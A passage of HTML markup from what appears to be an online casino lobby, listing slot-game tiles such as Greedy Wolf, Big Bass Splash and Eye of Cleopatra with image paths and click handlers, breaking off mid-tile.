                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Greedy Wolf™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Greedy Wolf™', '/assets/games/i/165x220/85a3dcf48496c2c6c83b72fedffbfa98.webp?v=0.1' , 'vs20wolfie', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/85a3dcf48496c2c6c83b72fedffbfa98.webp?v=0.1" src="/assets/games/i/165x220/85a3dcf48496c2c6c83b72fedffbfa98.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Greedy Wolf™">Greedy Wolf™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gorilla Mayhem™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gorilla Mayhem™', '/assets/games/i/165x220/973902c284f77049938607bdb5d8956d.webp?v=0.1' , 'vs1024gmayhem', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/973902c284f77049938607bdb5d8956d.webp?v=0.1" src="/assets/games/i/165x220/973902c284f77049938607bdb5d8956d.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gorilla Mayhem™">Gorilla Mayhem™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Magic Money Maze" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Magic Money Maze', '/assets/games/i/165x220/971909321b906154e8c5de430d5525f3.webp?v=0.1' , 'vs10mmm', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/971909321b906154e8c5de430d5525f3.webp?v=0.1" src="/assets/games/i/165x220/971909321b906154e8c5de430d5525f3.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Magic Money Maze">Magic Money Maze</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fire Hot 40™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fire Hot 40™', '/assets/games/i/165x220/87774522455f7488a8297f4aa842feea.webp?v=0.1' , 'vs40firehot', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/87774522455f7488a8297f4aa842feea.webp?v=0.1" src="/assets/games/i/165x220/87774522455f7488a8297f4aa842feea.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fire Hot 40™">Fire Hot 40™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Candy Stars™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Candy Stars™', '/assets/games/i/165x220/4537caf4a2a29ed4a3342e108a926e10.webp?v=0.1' , 'vswaysstrwild', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/4537caf4a2a29ed4a3342e108a926e10.webp?v=0.1" src="/assets/games/i/165x220/4537caf4a2a29ed4a3342e108a926e10.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Candy Stars™">Candy Stars™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Black Bull™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Black Bull™', '/assets/games/i/165x220/d7a432c533f7420030d6702485e41cf1.webp?v=0.1' , 'vs20trswild2', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/d7a432c533f7420030d6702485e41cf1.webp?v=0.1" src="/assets/games/i/165x220/d7a432c533f7420030d6702485e41cf1.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Black Bull™">Black Bull™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Queen of Gods™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Queen of Gods™', '/assets/games/i/165x220/e3830658264cac601af1c36d58ed1bb5.webp?v=0.1' , 'vs10egrich', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/e3830658264cac601af1c36d58ed1bb5.webp?v=0.1" src="/assets/games/i/165x220/e3830658264cac601af1c36d58ed1bb5.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Queen of Gods™">Queen of Gods™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Shining Hot 5™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Shining Hot 5™', '/assets/games/i/165x220/b03dabbf16996e0cb0bcd8c429156903.webp?v=0.1' , 'vs5sh', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/b03dabbf16996e0cb0bcd8c429156903.webp?v=0.1" src="/assets/games/i/165x220/b03dabbf16996e0cb0bcd8c429156903.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Shining Hot 5™">Shining Hot 5™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Shining Hot 40™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Shining Hot 40™', '/assets/games/i/165x220/6c0b08bf2ce93325b3eab7d00bce3674.webp?v=0.1' , 'vs40sh', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/6c0b08bf2ce93325b3eab7d00bce3674.webp?v=0.1" src="/assets/games/i/165x220/6c0b08bf2ce93325b3eab7d00bce3674.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Shining Hot 40™">Shining Hot 40™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Tropical Tiki™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Tropical Tiki™', '/assets/games/i/165x220/16c3c818ac24569180ebc7f092c37920.webp?v=0.1' , 'vswaysjkrdrop', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/16c3c818ac24569180ebc7f092c37920.webp?v=0.1" src="/assets/games/i/165x220/16c3c818ac24569180ebc7f092c37920.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Tropical Tiki™">Tropical Tiki™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Bomb Bonanza™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Bomb Bonanza™', '/assets/games/i/165x220/38af666dcadb4ca6007b51f72f6fac0b.webp?v=0.1' , 'vs25bomb', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/38af666dcadb4ca6007b51f72f6fac0b.webp?v=0.1" src="/assets/games/i/165x220/38af666dcadb4ca6007b51f72f6fac0b.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Bomb Bonanza™">Bomb Bonanza™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Cosmic Cash™" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Cosmic Cash™', '/assets/games/i/165x220/c83dc31fe9fb4e49c3c5480a31d69fb7.webp?v=0.1' , 'vs40cosmiccash', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/c83dc31fe9fb4e49c3c5480a31d69fb7.webp?v=0.1" src="/assets/games/i/165x220/c83dc31fe9fb4e49c3c5480a31d69fb7.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Cosmic Cash™">Cosmic Cash™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Coffee Wild" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Coffee Wild', '/assets/games/i/165x220/ca5a36b70a61e0ace122d016e303d280.webp?v=0.1' , 'vs10coffee', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/ca5a36b70a61e0ace122d016e303d280.webp?v=0.1" src="/assets/games/i/165x220/ca5a36b70a61e0ace122d016e303d280.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Coffee Wild">Coffee Wild</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Shining Hot 100™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Shining Hot 100™', '/assets/games/i/165x220/2c9086ac74454fcf3f6151553aae07ab.webp?v=0.1' , 'vs100sh', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/2c9086ac74454fcf3f6151553aae07ab.webp?v=0.1" src="/assets/games/i/165x220/2c9086ac74454fcf3f6151553aae07ab.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Shining Hot 100™">Shining Hot 100™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Cleocatra™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Cleocatra™', '/assets/games/i/165x220/84c0cb1f4320080afba480ef40a9a8bc.webp?v=0.1' , 'vs20cleocatra', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/84c0cb1f4320080afba480ef40a9a8bc.webp?v=0.1" src="/assets/games/i/165x220/84c0cb1f4320080afba480ef40a9a8bc.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Cleocatra™">Cleocatra™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Little Gem" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Little Gem', '/assets/games/i/165x220/17b19099df5a7293394a888940e2aa96.webp?v=0.1' , 'vs5littlegem', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/17b19099df5a7293394a888940e2aa96.webp?v=0.1" src="/assets/games/i/165x220/17b19099df5a7293394a888940e2aa96.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Little Gem">Little Gem</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Big Bass Splash" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Big Bass Splash', '/assets/games/i/165x220/0fb78edea3d7a4461e28605a62ab52d9.webp?v=0.1' , 'vs10txbigbass', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/0fb78edea3d7a4461e28605a62ab52d9.webp?v=0.1" src="/assets/games/i/165x220/0fb78edea3d7a4461e28605a62ab52d9.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Big Bass Splash">Big Bass Splash</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Rise of Samurai 3™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Rise of Samurai 3™', '/assets/games/i/165x220/2acf9aad3bb3d080c04bd3d9cfe183e1.webp?v=0.1' , 'vs40samurai3', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/2acf9aad3bb3d080c04bd3d9cfe183e1.webp?v=0.1" src="/assets/games/i/165x220/2acf9aad3bb3d080c04bd3d9cfe183e1.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Rise of Samurai 3™">Rise of Samurai 3™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mahjong Panda" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mahjong Panda', '/assets/games/i/165x220/4d08360a9990f943e692e2d4ab7cdba5.webp?v=0.1' , 'vs1024mahjpanda', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/4d08360a9990f943e692e2d4ab7cdba5.webp?v=0.1" src="/assets/games/i/165x220/4d08360a9990f943e692e2d4ab7cdba5.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mahjong Panda">Mahjong Panda</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Shining Hot 20™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Shining Hot 20™', '/assets/games/i/165x220/216e8b195bdee8a61717c133fb1da0c9.webp?v=0.1' , 'vs20sh', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/216e8b195bdee8a61717c133fb1da0c9.webp?v=0.1" src="/assets/games/i/165x220/216e8b195bdee8a61717c133fb1da0c9.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Shining Hot 20™">Shining Hot 20™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Goblin Heist Powernudge™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Goblin Heist Powernudge™', '/assets/games/i/165x220/da0392e3b27cb3f4589c820b2d10e544.webp?v=0.1' , 'vs20gobnudge', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/da0392e3b27cb3f4589c820b2d10e544.webp?v=0.1" src="/assets/games/i/165x220/da0392e3b27cb3f4589c820b2d10e544.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Goblin Heist Powernudge™">Goblin Heist Powernudge™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Pirate Gold" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Pirate Gold', '/assets/games/i/165x220/1c7b8887fc91bc89ec5489e1c2a7ed1e.webp?v=0.1' , 'vs40pirate', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/1c7b8887fc91bc89ec5489e1c2a7ed1e.webp?v=0.1" src="/assets/games/i/165x220/1c7b8887fc91bc89ec5489e1c2a7ed1e.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Pirate Gold">Pirate Gold</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Drill that Gold™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Drill that Gold™', '/assets/games/i/165x220/6a8a83f5717e61b8a16d67f72696b3b4.webp?v=0.1' , 'vs20drtgold', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/6a8a83f5717e61b8a16d67f72696b3b4.webp?v=0.1" src="/assets/games/i/165x220/6a8a83f5717e61b8a16d67f72696b3b4.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Drill that Gold™">Drill that Gold™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Zombie Carnival™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Zombie Carnival™', '/assets/games/i/165x220/5274bbae72560c295fcea3faa2702c49.webp?v=0.1' , 'vswayszombcarn', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/5274bbae72560c295fcea3faa2702c49.webp?v=0.1" src="/assets/games/i/165x220/5274bbae72560c295fcea3faa2702c49.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Zombie Carnival™">Zombie Carnival™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="North Guardians™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'North Guardians™', '/assets/games/i/165x220/84c28a1f10c27dd86c5b4af65496688e.webp?v=0.1' , 'vs50northgard', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/84c28a1f10c27dd86c5b4af65496688e.webp?v=0.1" src="/assets/games/i/165x220/84c28a1f10c27dd86c5b4af65496688e.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="North Guardians™">North Guardians™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Ancient Egypt" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Ancient Egypt', '/assets/games/i/165x220/3b37488673464b193184253f2e32ebe7.webp?v=0.1' , 'vs10egypt', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/3b37488673464b193184253f2e32ebe7.webp?v=0.1" src="/assets/games/i/165x220/3b37488673464b193184253f2e32ebe7.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Ancient Egypt">Ancient Egypt</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Treasure Horse" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Treasure Horse', '/assets/games/i/165x220/3e223893ebcd766a54d2bd259b808129.webp?v=0.1' , 'vs18mashang', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/3e223893ebcd766a54d2bd259b808129.webp?v=0.1" src="/assets/games/i/165x220/3e223893ebcd766a54d2bd259b808129.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Treasure Horse">Treasure Horse</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Tree of Riches" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Tree of Riches', '/assets/games/i/165x220/84b096bd43c2272da903088f57a1ea82.webp?v=0.1' , 'vs1fortunetree', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/84b096bd43c2272da903088f57a1ea82.webp?v=0.1" src="/assets/games/i/165x220/84b096bd43c2272da903088f57a1ea82.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Tree of Riches">Tree of Riches</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gold Rush" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gold Rush', '/assets/games/i/165x220/fc8141b75fd6cd009f310e16cc2fa9f4.webp?v=0.1' , 'vs25goldrush', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/fc8141b75fd6cd009f310e16cc2fa9f4.webp?v=0.1" src="/assets/games/i/165x220/fc8141b75fd6cd009f310e16cc2fa9f4.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gold Rush">Gold Rush</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Monkey Warrior" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Monkey Warrior', '/assets/games/i/165x220/7448264b6898638e06e1408992bc74ad.webp?v=0.1' , 'vs243mwarrior', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/7448264b6898638e06e1408992bc74ad.webp?v=0.1" src="/assets/games/i/165x220/7448264b6898638e06e1408992bc74ad.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Monkey Warrior">Monkey Warrior</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Eye of Cleopatra" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Eye of Cleopatra', '/assets/games/i/165x220/9e38a0ecebc1efdfff4f978b0f4c2f17.webp?v=0.1' , 'vs40cleoeye', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/9e38a0ecebc1efdfff4f978b0f4c2f17.webp?v=0.1" src="/assets/games/i/165x220/9e38a0ecebc1efdfff4f978b0f4c2f17.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Eye of Cleopatra">Eye of Cleopatra</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fire Strike 2" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fire Strike 2', '/assets/games/i/165x220/086ea618b2af5fc86a2a3ddeaf10d584.webp?v=0.2' , 'vs10firestrike2', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/086ea618b2af5fc86a2a3ddeaf10d584.webp?v=0.2" src="/assets/games/i/165x220/086ea618b2af5fc86a2a3ddeaf10d584.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fire Strike 2">Fire Strike 2</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="The Great Stick-Up™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'The Great Stick-Up™', '/assets/games/i/165x220/30a1a2a541983aadc47db93fc2c00178.webp?v=0.1' , 'vs20stickysymbol', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/30a1a2a541983aadc47db93fc2c00178.webp?v=0.1" src="/assets/games/i/165x220/30a1a2a541983aadc47db93fc2c00178.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="The Great Stick-Up™">The Great Stick-Up™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="John Hunter and the Tomb of the Scarab Queen" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'John Hunter and the Tomb of the Scarab Queen', '/assets/games/i/165x220/7084180f2a0bfc8b0d2fd7c7c5e6f0ae.webp?v=0.1' , 'vs25scarabqueen', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/7084180f2a0bfc8b0d2fd7c7c5e6f0ae.webp?v=0.1" src="/assets/games/i/165x220/7084180f2a0bfc8b0d2fd7c7c5e6f0ae.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="John Hunter and the Tomb of the Scarab Queen">John Hunter and the Tomb of the Scarab Queen</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Chicken Chase™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Chicken Chase™', '/assets/games/i/165x220/4c00d7801373e0bad10bb6b1cc79efed.webp?v=0.1' , 'vs10chkchase', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/4c00d7801373e0bad10bb6b1cc79efed.webp?v=0.1" src="/assets/games/i/165x220/4c00d7801373e0bad10bb6b1cc79efed.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Chicken Chase™">Chicken Chase™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Spirit of Adventure" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Spirit of Adventure', '/assets/games/i/165x220/e40ea0e9efd07e5edbbdb08e35e1ffbc.webp?v=0.1' , 'vs10spiritadv', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/e40ea0e9efd07e5edbbdb08e35e1ffbc.webp?v=0.1" src="/assets/games/i/165x220/e40ea0e9efd07e5edbbdb08e35e1ffbc.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Spirit of Adventure">Spirit of Adventure</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="5 Lions Gold" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    '5 Lions Gold', '/assets/games/i/165x220/7f60aa9913bcfc9ef434c62b879588df.webp?v=0.1' , 'vs243lionsgold', '' )" style="">

          <div class="content-wrapper">
              
